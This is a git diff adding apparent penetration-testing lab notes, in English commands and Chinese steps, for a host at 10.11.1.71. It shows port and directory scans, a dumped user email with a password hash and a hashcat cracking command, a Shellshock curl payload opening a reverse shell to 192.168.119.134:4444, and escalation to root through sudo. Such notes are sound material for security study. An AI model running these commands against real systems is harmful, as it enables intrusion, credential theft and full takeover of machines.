@@ -1,0 +1,26 @@
+nmap -sV -sC -Pn  10.11.1.71 > nmap.txt
+gobuster dir  -u http://10.11.1.71  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi -t50 > gobuster.txt
+gobuster dir  -u http://bigtreecms.org  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi -t50 > gobuster.txt
+
+gobuster dir  -u http://bigtreecms.org/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+gobuster dir  -u http://bigtreecms.org/cgi-bin/  -w /usr/share/wordlists/dirb/vulns/cgis.txt -x txt,php,cgi -t50 > gobustercgi.txt
+
+mysql -uroot -p
+
+gibson@nobrains.com | $P$BR2C9zC2Aau72.4cNZfJPC.iV8Ppj41
+$P$BR2C9zC2Aau72.4cNZfJPC.iV8Ppj41 - Possible algorithms: phpass, phpBB3 (MD5), Joomla >= 2.5.18 (MD5), WordPress (MD5)
+
+hashcat -m 400  phphash /usr/share/wordlists/rockyou.txt
+
+
+1.80頁面上有看到about查看到bigtreecms.org域名,綁定host
+2.gobuster掃描到cgi-bin/路徑,在針對這路徑用cgi的list做gobuster
+3.發現有http://bigtreecms.org/cgi-bin/admin.cgi
+4.測試admin.cgi是否有cgi漏洞
+5.使用以下指令取得reverse shell  curl -A "() { :;};echo; /bin/bash -i >& /dev/tcp/192.168.119.134/4444 0>&1" http://bigtreecms.org/cgi-bin/admin.cgi
+6./var/www/html/下查找密碼,config.php內有DB帳密
+7.登入DB後查找庫裡有gibson的帳密,使用hastcat破解密碼發現密碼一樣,嘗試切換到gibson用戶
+8.sudo -l 發現all 直接 sudo bash
+
+
+
